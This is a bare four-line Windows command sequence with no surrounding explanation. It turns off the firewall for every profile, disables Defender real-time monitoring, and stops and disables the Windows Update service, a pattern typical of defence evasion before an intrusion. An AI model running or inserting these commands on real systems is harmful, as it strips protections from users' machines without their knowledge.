Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False

Set-MpPreference -DisableRealtimeMonitoring $true

sc.exe stop wuauserv

sc.exe config wuauserv start=disabled
